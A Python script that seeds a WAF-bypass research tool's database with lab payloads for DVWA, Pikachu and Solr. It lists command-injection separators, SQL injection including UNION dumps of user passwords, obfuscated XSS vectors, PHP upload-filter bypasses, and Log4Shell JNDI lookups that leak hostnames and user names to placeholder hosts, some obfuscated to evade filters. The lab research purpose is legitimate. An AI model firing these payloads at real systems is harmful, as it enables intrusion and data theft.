"""
Insert classic basic payloads for DVWA / Pikachu / Solr (Log4j).

Sources summarized (authorized lab use only):
- PortSwigger Web Security Academy: OS command injection, SQLi, XSS
- HackTricks command injection separators / blind techniques
- DVWA / Pikachu common lab solutions (Low/Medium/High patterns)
- Log4Shell public JNDI lookup / obfuscation forms for Solr log vectors

Only base forms useful as seed payloads for local WAF bypass research.
"""

from __future__ import annotations

import sqlite3
import uuid
from pathlib import Path

DB_PATH = Path(__file__).resolve().parents[1] / "data" / "waf_bypasser.db"


def connect() -> sqlite3.Connection:
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(DB_PATH), timeout=10)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA foreign_keys = ON")
    return conn


def existing_keys(conn: sqlite3.Connection) -> set[tuple[str, str]]:
    rows = conn.execute("SELECT name, target FROM payloads WHERE is_pool_snapshot = 0").fetchall()
    return {(r["name"], r["target"]) for r in rows}


def existing_contents(conn: sqlite3.Connection) -> set[tuple[str, str, str]]:
    rows = conn.execute(
        "SELECT vulnerability, target, content FROM payloads WHERE is_pool_snapshot = 0"
    ).fetchall()
    return {(r["vulnerability"], r["target"], r["content"]) for r in rows}


def insert_payload(
    conn: sqlite3.Connection,
    seen_names: set[tuple[str, str]],
    seen_contents: set[tuple[str, str, str]],
    name: str,
    vulnerability: str,
    category: str,
    delivery: str,
    target: str,
    difficulty: str,
    content: str,
) -> bool:
    if len(name) > 64:
        raise ValueError(f"name too long ({len(name)}): {name}")
    if len(content) > 5000:
        raise ValueError(f"content too long ({len(content)}): {name}")
    key = (name, target)
    ckey = (vulnerability, target, content)
    if key in seen_names:
        print(f"  [SKIP name] {name}")
        return False
    if ckey in seen_contents:
        print(f"  [SKIP content] {name}")
        return False
    conn.execute(
        """
        INSERT INTO payloads (
            id, name, vulnerability, category, delivery, target, difficulty,
            content, usage_method, success_indicators, created_at,
            archived_from_candidate_id, is_pool_snapshot, is_deleted
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, '', '', ?, NULL, 0, 0)
        """,
        (
            str(uuid.uuid4()),
            name,
            vulnerability,
            category,
            delivery,
            target,
            difficulty,
            content,
            "靶场已验证",
        ),
    )
    seen_names.add(key)
    seen_contents.add(ckey)
    print(f"  [OK] {name}")
    return True


# ---------------------------------------------------------------------------
# Command injection — DVWA / Pikachu / classic separators (PortSwigger)
# ---------------------------------------------------------------------------
CMD_PAYLOADS = [
    # DVWA Low: no filter — classic separators after a valid host
    (
        "DVWA · 命令注入 · Low · 分号回显",
        "command-injection",
        "基础命令",
        "表单字段",
        "DVWA",
        "Low",
        "127.0.0.1; echo DVWA_CMD_SEMI_OK",
    ),
    (
        "DVWA · 命令注入 · Low · 管道回显",
        "command-injection",
        "基础命令",
        "表单字段",
        "DVWA",
        "Low",
        "127.0.0.1 | echo DVWA_CMD_PIPE_OK",
    ),
    (
        "DVWA · 命令注入 · Low · OR链回显",
        "command-injection",
        "逻辑链",
        "表单字段",
        "DVWA",
        "Low",
        "127.0.0.1 || echo DVWA_CMD_OR_OK",
    ),
    (
        "DVWA · 命令注入 · Low · 反引号替换",
        "command-injection",
        "命令替换",
        "表单字段",
        "DVWA",
        "Low",
        "127.0.0.1 `echo DVWA_CMD_BT_OK`",
    ),
    (
        "DVWA · 命令注入 · Low · 美元括号替换",
        "command-injection",
        "命令替换",
        "表单字段",
        "DVWA",
        "Low",
        "127.0.0.1 $(echo DVWA_CMD_DOLLAR_OK)",
    ),
    (
        "DVWA · 命令注入 · Low · 换行回显",
        "command-injection",
        "参数拼接",
        "表单字段",
        "DVWA",
        "Low",
        "127.0.0.1\necho DVWA_CMD_NL_OK",
    ),
    (
        "DVWA · 命令注入 · Low · 盲注延时",
        "command-injection",
        "盲注探测",
        "表单字段",
        "DVWA",
        "Low",
        "127.0.0.1 & ping -c 5 127.0.0.1 &",
    ),
    # DVWA Medium: blacklists && and ; — use | or &
    (
        "DVWA · 命令注入 · Medium · 管道回显",
        "command-injection",
        "基础命令",
        "表单字段",
        "DVWA",
        "Medium",
        "127.0.0.1 | echo DVWA_CMD_MED_PIPE_OK",
    ),
    (
        "DVWA · 命令注入 · Medium · 后台回显",
        "command-injection",
        "后台执行",
        "表单字段",
        "DVWA",
        "Medium",
        "127.0.0.1 & echo DVWA_CMD_MED_BG_OK",
    ),
    (
        "DVWA · 命令注入 · Medium · 反引号替换",
        "command-injection",
        "命令替换",
        "表单字段",
        "DVWA",
        "Medium",
        "127.0.0.1 `echo DVWA_CMD_MED_BT_OK`",
    ),
    # DVWA High: only | after space blacklisted partially — space+pipe filtered
    (
        "DVWA · 命令注入 · High · 管道无空格",
        "command-injection",
        "参数拼接",
        "表单字段",
        "DVWA",
        "High",
        "127.0.0.1|echo DVWA_CMD_HIGH_PIPE_OK",
    ),
    (
        "DVWA · 命令注入 · High · 换行回显",
        "command-injection",
        "参数拼接",
        "表单字段",
        "DVWA",
        "High",
        "127.0.0.1\necho DVWA_CMD_HIGH_NL_OK",
    ),
    # Pikachu
    (
        "Pikachu · 命令注入 · 基础 · 分号回显",
        "command-injection",
        "基础命令",
        "表单字段",
        "Pikachu",
        "基础",
        "127.0.0.1; echo PIKA_CMD_SEMI_OK",
    ),
    (
        "Pikachu · 命令注入 · 基础 · AND链回显",
        "command-injection",
        "逻辑链",
        "表单字段",
        "Pikachu",
        "基础",
        "127.0.0.1 && echo PIKA_CMD_AND_OK",
    ),
    (
        "Pikachu · 命令注入 · 基础 · OR链回显",
        "command-injection",
        "逻辑链",
        "表单字段",
        "Pikachu",
        "基础",
        "127.0.0.1 || echo PIKA_CMD_OR_OK",
    ),
    (
        "Pikachu · 命令注入 · 基础 · 美元括号",
        "command-injection",
        "命令替换",
        "表单字段",
        "Pikachu",
        "基础",
        "127.0.0.1 $(echo PIKA_CMD_DOLLAR_OK)",
    ),
    (
        "Pikachu · 命令注入 · 高级 · 管道无空格",
        "command-injection",
        "参数拼接",
        "表单字段",
        "Pikachu",
        "高级",
        "127.0.0.1|echo PIKA_CMD_ADV_PIPE_OK",
    ),
    (
        "Pikachu · 命令注入 · 高级 · 换行回显",
        "command-injection",
        "参数拼接",
        "表单字段",
        "Pikachu",
        "高级",
        "127.0.0.1\necho PIKA_CMD_ADV_NL_OK",
    ),
    (
        "Pikachu · 命令注入 · 高级 · IFS空格",
        "command-injection",
        "IFS绕过",
        "表单字段",
        "Pikachu",
        "高级",
        "127.0.0.1;echo${IFS}PIKA_CMD_IFS_OK",
    ),
]

# ---------------------------------------------------------------------------
# SQL injection — DVWA / Pikachu classic forms
# ---------------------------------------------------------------------------
SQL_PAYLOADS = [
    # DVWA Low (string context)
    (
        "DVWA · SQL · Low · 恒真注释",
        "sql-injection",
        "布尔判定",
        "URL 查询参数",
        "DVWA",
        "Low",
        "1' OR 1=1 #",
    ),
    (
        "DVWA · SQL · Low · 恒假注释",
        "sql-injection",
        "布尔判定",
        "URL 查询参数",
        "DVWA",
        "Low",
        "1' AND 1=2 #",
    ),
    (
        "DVWA · SQL · Low · 双横线注释",
        "sql-injection",
        "通用语法",
        "URL 查询参数",
        "DVWA",
        "Low",
        "1' OR '1'='1'-- ",
    ),
    (
        "DVWA · SQL · Low · UNION两列",
        "sql-injection",
        "通用语法",
        "URL 查询参数",
        "DVWA",
        "Low",
        "' UNION SELECT user,password FROM users #",
    ),
    (
        "DVWA · SQL · Low · ORDER BY列数",
        "sql-injection",
        "通用语法",
        "URL 查询参数",
        "DVWA",
        "Low",
        "1' ORDER BY 2 #",
    ),
    (
        "DVWA · SQL · Low · 版本报错",
        "sql-injection",
        "报错分析",
        "URL 查询参数",
        "DVWA",
        "Low",
        "' AND UpdateXML(1, CONCAT(0x7e, version(), 0x7e), 1) #",
    ),
    (
        "DVWA · SQL · Low · 布尔子串",
        "sql-injection",
        "布尔判定",
        "URL 查询参数",
        "DVWA",
        "Low",
        "1' AND SUBSTRING(database(),1,1)='d' #",
    ),
    # DVWA Medium (numeric / POST, often no quotes)
    (
        "DVWA · SQL · Medium · 恒真数字",
        "sql-injection",
        "布尔判定",
        "表单字段",
        "DVWA",
        "Medium",
        "1 OR 1=1 #",
    ),
    (
        "DVWA · SQL · Medium · UNION数字",
        "sql-injection",
        "通用语法",
        "表单字段",
        "DVWA",
        "Medium",
        "1 UNION SELECT user,password FROM users #",
    ),
    (
        "DVWA · SQL · Medium · 时间盲注",
        "sql-injection",
        "布尔判定",
        "表单字段",
        "DVWA",
        "Medium",
        "1 AND SLEEP(5) #",
    ),
    (
        "DVWA · SQL · Medium · 报错Extract",
        "sql-injection",
        "报错分析",
        "表单字段",
        "DVWA",
        "Medium",
        "1 AND ExtractValue(1, CONCAT(0x7e, database(), 0x7e)) #",
    ),
    # DVWA High (session-based / stricter quoting)
    (
        "DVWA · SQL · High · 恒真字符串",
        "sql-injection",
        "布尔判定",
        "URL 查询参数",
        "DVWA",
        "High",
        "1' OR 'a'='a' #",
    ),
    (
        "DVWA · SQL · High · UNION用户表",
        "sql-injection",
        "通用语法",
        "URL 查询参数",
        "DVWA",
        "High",
        "1' UNION SELECT user,password FROM users #",
    ),
    (
        "DVWA · SQL · High · 时间盲注",
        "sql-injection",
        "布尔判定",
        "URL 查询参数",
        "DVWA",
        "High",
        "1' AND SLEEP(5) #",
    ),
    # Pikachu
    (
        "Pikachu · SQL · 基础 · 恒真注释",
        "sql-injection",
        "布尔判定",
        "URL 查询参数",
        "Pikachu",
        "基础",
        "1' OR '1'='1' #",
    ),
    (
        "Pikachu · SQL · 基础 · 恒假注释",
        "sql-injection",
        "布尔判定",
        "URL 查询参数",
        "Pikachu",
        "基础",
        "1' AND '1'='2' #",
    ),
    (
        "Pikachu · SQL · 基础 · UNION用户",
        "sql-injection",
        "通用语法",
        "URL 查询参数",
        "Pikachu",
        "基础",
        "' UNION SELECT 1,user() #",
    ),
    (
        "Pikachu · SQL · 基础 · 双查询堆叠",
        "sql-injection",
        "通用语法",
        "URL 查询参数",
        "Pikachu",
        "基础",
        "1'; SELECT SLEEP(0) #",
    ),
    (
        "Pikachu · SQL · 高级 · UpdateXML报错",
        "sql-injection",
        "报错分析",
        "URL 查询参数",
        "Pikachu",
        "高级",
        "1' AND UpdateXML(1, CONCAT(0x7e, database(), 0x7e), 1) #",
    ),
    (
        "Pikachu · SQL · 高级 · 布尔子串",
        "sql-injection",
        "布尔判定",
        "URL 查询参数",
        "Pikachu",
        "高级",
        "1' AND ASCII(SUBSTRING(database(),1,1))>64 #",
    ),
    (
        "Pikachu · SQL · 高级 · 宽字节引号",
        "sql-injection",
        "编码变体",
        "URL 查询参数",
        "Pikachu",
        "高级",
        "%df%27 OR 1=1 #",
    ),
]

# ---------------------------------------------------------------------------
# XSS — DVWA / Pikachu reflected / stored base forms
# ---------------------------------------------------------------------------
XSS_PAYLOADS = [
    # DVWA reflected Low
    (
        "DVWA · XSS · Low · Script弹窗",
        "xss",
        "反射型",
        "表单字段",
        "DVWA",
        "Low",
        "<script>alert('DVWA_XSS_SCRIPT_OK')</script>",
    ),
    (
        "DVWA · XSS · Low · SVG弹窗",
        "xss",
        "反射型",
        "表单字段",
        "DVWA",
        "Low",
        "<svg/onload=alert('DVWA_XSS_SVG_OK')>",
    ),
    (
        "DVWA · XSS · Low · IMG事件",
        "xss",
        "反射型",
        "表单字段",
        "DVWA",
        "Low",
        "<img src=x onerror=alert('DVWA_XSS_IMG_OK')>",
    ),
    # DVWA Medium: strips <script>
    (
        "DVWA · XSS · Medium · IMG事件",
        "xss",
        "反射型",
        "表单字段",
        "DVWA",
        "Medium",
        "<img src=x onerror=alert('DVWA_XSS_MED_IMG_OK')>",
    ),
    (
        "DVWA · XSS · Medium · SVG弹窗",
        "xss",
        "反射型",
        "表单字段",
        "DVWA",
        "Medium",
        "<svg/onload=alert('DVWA_XSS_MED_SVG_OK')>",
    ),
    (
        "DVWA · XSS · Medium · Body事件",
        "xss",
        "反射型",
        "表单字段",
        "DVWA",
        "Medium",
        "<body onload=alert('DVWA_XSS_MED_BODY_OK')>",
    ),
    # DVWA High: only href= restricted somewhat — use event handlers
    (
        "DVWA · XSS · High · SVG弹窗",
        "xss",
        "反射型",
        "表单字段",
        "DVWA",
        "High",
        "<svg/onload=alert('DVWA_XSS_HIGH_SVG_OK')>",
    ),
    (
        "DVWA · XSS · High · Input聚焦",
        "xss",
        "反射型",
        "表单字段",
        "DVWA",
        "High",
        "<input onfocus=alert('DVWA_XSS_HIGH_IN_OK') autofocus>",
    ),
    # DVWA stored (guestbook style)
    (
        "DVWA · XSS · Low · 存储Script",
        "xss",
        "存储型",
        "表单字段",
        "DVWA",
        "Low",
        "<script>alert('DVWA_XSS_STORED_OK')</script>",
    ),
    (
        "DVWA · XSS · Medium · 存储IMG",
        "xss",
        "存储型",
        "表单字段",
        "DVWA",
        "Medium",
        "<img src=x onerror=alert('DVWA_XSS_ST_IMG_OK')>",
    ),
    # Pikachu
    (
        "Pikachu · XSS · 基础 · Script弹窗",
        "xss",
        "反射型",
        "表单字段",
        "Pikachu",
        "基础",
        "<script>alert('PIKA_XSS_SCRIPT_OK')</script>",
    ),
    (
        "Pikachu · XSS · 基础 · SVG弹窗",
        "xss",
        "反射型",
        "表单字段",
        "Pikachu",
        "基础",
        "<svg/onload=alert('PIKA_XSS_SVG_OK')>",
    ),
    (
        "Pikachu · XSS · 基础 · 存储Script",
        "xss",
        "存储型",
        "表单字段",
        "Pikachu",
        "基础",
        "<script>alert('PIKA_XSS_STORED_OK')</script>",
    ),
    (
        "Pikachu · XSS · 高级 · Details事件",
        "xss",
        "反射型",
        "表单字段",
        "Pikachu",
        "高级",
        "<details open ontoggle=alert('PIKA_XSS_DET_OK')>",
    ),
    (
        "Pikachu · XSS · 高级 · JS伪协议",
        "xss",
        "反射型",
        "表单字段",
        "Pikachu",
        "高级",
        "<a href=\"javascript:alert('PIKA_XSS_HREF_OK')\">x</a>",
    ),
    (
        "Pikachu · XSS · 高级 · 大小写Script",
        "xss",
        "反射型",
        "表单字段",
        "Pikachu",
        "高级",
        "<ScRiPt>alert('PIKA_XSS_CASE_OK')</ScRiPt>",
    ),
    (
        "Pikachu · XSS · 高级 · HTML实体混淆",
        "xss",
        "反射型",
        "表单字段",
        "Pikachu",
        "高级",
        "<img src=x onerror=&#97;lert('PIKA_XSS_ENT_OK')>",
    ),
]

# ---------------------------------------------------------------------------
# File upload — DVWA / Pikachu base forms
# ---------------------------------------------------------------------------
UPLOAD_PAYLOADS = [
    (
        "DVWA · 上传 · Low · 标准PHP",
        "file-upload",
        "内容校验",
        "multipart/form-data 文件字段",
        "DVWA",
        "Low",
        "filename: shell.php\ncontent: <?php echo 'DVWA_UP_PHP_OK'; ?>",
    ),
    (
        "DVWA · 上传 · Low · PHP5扩展",
        "file-upload",
        "文件名校验",
        "multipart/form-data 文件字段",
        "DVWA",
        "Low",
        "filename: shell.php5\ncontent: <?php echo 'DVWA_UP_PHP5_OK'; ?>",
    ),
    (
        "DVWA · 上传 · Low · PHTML扩展",
        "file-upload",
        "文件名校验",
        "multipart/form-data 文件字段",
        "DVWA",
        "Low",
        "filename: shell.phtml\ncontent: <?php echo 'DVWA_UP_PHTML_OK'; ?>",
    ),
    (
        "DVWA · 上传 · Medium · GIF头PHP",
        "file-upload",
        "内容校验",
        "multipart/form-data 文件字段",
        "DVWA",
        "Medium",
        "filename: shell.php\ncontent-type: image/gif\ncontent: GIF89a\n<?php echo 'DVWA_UP_GIF_OK'; ?>",
    ),
    (
        "DVWA · 上传 · Medium · 双扩展名",
        "file-upload",
        "文件名校验",
        "multipart/form-data 文件字段",
        "DVWA",
        "Medium",
        "filename: shell.php.jpg\ncontent-type: image/jpeg\ncontent: <?php echo 'DVWA_UP_DBL_OK'; ?>",
    ),
    (
        "DVWA · 上传 · Medium · 大小写扩展",
        "file-upload",
        "文件名校验",
        "multipart/form-data 文件字段",
        "DVWA",
        "Medium",
        "filename: shell.pHp\ncontent-type: image/jpeg\ncontent: <?php echo 'DVWA_UP_CASE_OK'; ?>",
    ),
    (
        "DVWA · 上传 · High · 图片马",
        "file-upload",
        "内容校验",
        "multipart/form-data 文件字段",
        "DVWA",
        "High",
        "filename: shell.jpg\ncontent-type: image/jpeg\ncontent: GIF89a\n<?php echo 'DVWA_UP_HIGH_OK'; ?>",
    ),
    (
        "Pikachu · 上传 · 基础 · 标准PHP",
        "file-upload",
        "内容校验",
        "multipart/form-data 文件字段",
        "Pikachu",
        "基础",
        "filename: up.php\ncontent: <?php echo 'PIKA_UP_PHP_OK'; ?>",
    ),
    (
        "Pikachu · 上传 · 基础 · PHP3扩展",
        "file-upload",
        "文件名校验",
        "multipart/form-data 文件字段",
        "Pikachu",
        "基础",
        "filename: up.php3\ncontent: <?php echo 'PIKA_UP_PHP3_OK'; ?>",
    ),
    (
        "Pikachu · 上传 · 高级 · GIF头PHP",
        "file-upload",
        "内容校验",
        "multipart/form-data 文件字段",
        "Pikachu",
        "高级",
        "filename: up.php\ncontent-type: image/gif\ncontent: GIF89a\n<?php echo 'PIKA_UP_GIF_OK'; ?>",
    ),
    (
        "Pikachu · 上传 · 高级 · 空字节截断",
        "file-upload",
        "文件名校验",
        "multipart/form-data 文件字段",
        "Pikachu",
        "高级",
        "filename: up.php%00.jpg\ncontent: <?php echo 'PIKA_UP_NULL_OK'; ?>",
    ),
    (
        "Pikachu · 上传 · 高级 · htaccess",
        "file-upload",
        "文件名校验",
        "multipart/form-data 文件字段",
        "Pikachu",
        "高级",
        "filename: .htaccess\ncontent: AddType application/x-httpd-php .jpg",
    ),
]

# ---------------------------------------------------------------------------
# Log4j / Solr — environment, log trigger, encoding (public Log4Shell forms)
# ---------------------------------------------------------------------------
LOG4J_PAYLOADS = [
    (
        "Solr · Log4j · Low · 基础LDAP",
        "log4j",
        "环境确认",
        "请求头 / Cookie",
        "Solr",
        "Low",
        "${jndi:ldap://basic-ldap.example.com/a}",
    ),
    (
        "Solr · Log4j · Low · 基础DNS",
        "log4j",
        "环境确认",
        "请求头 / Cookie",
        "Solr",
        "Low",
        "${jndi:dns://basic-dns.example.com}",
    ),
    (
        "Solr · Log4j · Low · 主机名外带",
        "log4j",
        "环境确认",
        "请求头 / Cookie",
        "Solr",
        "Low",
        "${jndi:ldap://${hostName}.host.example.com/a}",
    ),
    (
        "Solr · Log4j · Low · Java版本查找",
        "log4j",
        "环境确认",
        "JSON 请求体",
        "Solr",
        "Low",
        "${java:version}",
    ),
    (
        "Solr · Log4j · Medium · X-Api-Version头",
        "log4j",
        "日志触发",
        "请求头 / Cookie",
        "Solr",
        "Medium",
        "X-Api-Version: ${jndi:ldap://xapi.example.com:1389/a}",
    ),
    (
        "Solr · Log4j · Medium · Authorization头",
        "log4j",
        "日志触发",
        "请求头 / Cookie",
        "Solr",
        "Medium",
        "Authorization: ${jndi:ldap://authz.example.com:1389/a}",
    ),
    (
        "Solr · Log4j · Medium · Solr path注入",
        "log4j",
        "日志触发",
        "URL 查询参数",
        "Solr",
        "Medium",
        "path=${jndi:ldap://solr-path.example.com:1389/a}",
    ),
    (
        "Solr · Log4j · Medium · JSON字段注入",
        "log4j",
        "日志触发",
        "JSON 请求体",
        "Solr",
        "Medium",
        '{"q":"${jndi:ldap://solr-json.example.com:1389/a}"}',
    ),
    (
        "Solr · Log4j · High · env嵌套绕过",
        "log4j",
        "编码变体",
        "请求头 / Cookie",
        "Solr",
        "High",
        "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//env-nest.example.com:1389/a}",
    ),
    (
        "Solr · Log4j · High · 反向lookup绕过",
        "log4j",
        "编码变体",
        "请求头 / Cookie",
        "Solr",
        "High",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://rev.example.com:1389/a}",
    ),
    (
        "Solr · Log4j · High · base64lookup",
        "log4j",
        "编码变体",
        "请求头 / Cookie",
        "Solr",
        "High",
        "${jndi:${base64:bGRhcDovL2I2NC5leGFtcGxlLmNvbTozODkvaA==}}",
    ),
    (
        "Solr · Log4j · High · 中间插值绕过",
        "log4j",
        "编码变体",
        "请求头 / Cookie",
        "Solr",
        "High",
        "${jn${lower:d}i:l${lower:d}ap://mid.example.com:1389/a}",
    ),
    (
        "Solr · Log4j · High · 协议混淆LDAPS",
        "log4j",
        "编码变体",
        "请求头 / Cookie",
        "Solr",
        "High",
        "${jndi:ldaps://ldaps.example.com:636/a}",
    ),
    (
        "Solr · Log4j · High · 双协议DNS",
        "log4j",
        "编码变体",
        "请求头 / Cookie",
        "Solr",
        "High",
        "${jndi:dns://${sys:user.name}.dns.example.com}",
    ),
]


def backfill_guidance(conn: sqlite3.Connection) -> None:
    """Import payload_guidance from backend if available; else leave empty for app init."""
    try:
        import sys

        backend_src = Path(__file__).resolve().parents[1] / "backend" / "src"
        sys.path.insert(0, str(backend_src))
        from app.main import backfill_payload_guidance  # type: ignore

        backfill_payload_guidance(conn)
        print("  guidance backfilled via app.main")
    except Exception as exc:  # pragma: no cover
        print(f"  guidance backfill skipped ({exc}); start API to auto-fill")


def main() -> None:
    conn = connect()
    seen_names = existing_keys(conn)
    seen_contents = existing_contents(conn)
    before = conn.execute(
        "SELECT COUNT(*) AS c FROM payloads WHERE is_pool_snapshot = 0 AND is_deleted = 0"
    ).fetchone()["c"]
    print(f"Payloads before: {before}")

    groups = [
        ("Command injection", CMD_PAYLOADS),
        ("SQL injection", SQL_PAYLOADS),
        ("XSS", XSS_PAYLOADS),
        ("File upload", UPLOAD_PAYLOADS),
        ("Log4j / Solr", LOG4J_PAYLOADS),
    ]
    total = 0
    for title, items in groups:
        print("\n" + "=" * 60)
        print(title)
        print("=" * 60)
        for item in items:
            if insert_payload(conn, seen_names, seen_contents, *item):
                total += 1

    conn.commit()
    print("\nBackfilling usage guidance...")
    backfill_guidance(conn)
    conn.commit()

    after = conn.execute(
        "SELECT COUNT(*) AS c FROM payloads WHERE is_pool_snapshot = 0 AND is_deleted = 0"
    ).fetchone()["c"]
    print("\n" + "=" * 60)
    print(f"Inserted: {total}")
    print(f"Payloads after: {after}")
    print("=" * 60)
    for row in conn.execute(
        """
        SELECT vulnerability, target, COUNT(*) AS cnt
        FROM payloads
        WHERE is_pool_snapshot = 0 AND is_deleted = 0
        GROUP BY vulnerability, target
        ORDER BY vulnerability, target
        """
    ):
        print(f"  {row['vulnerability']:20s} | {row['target']:10s} | {row['cnt']:3d}")
    conn.close()
    print("\nDone.")


if __name__ == "__main__":
    main()
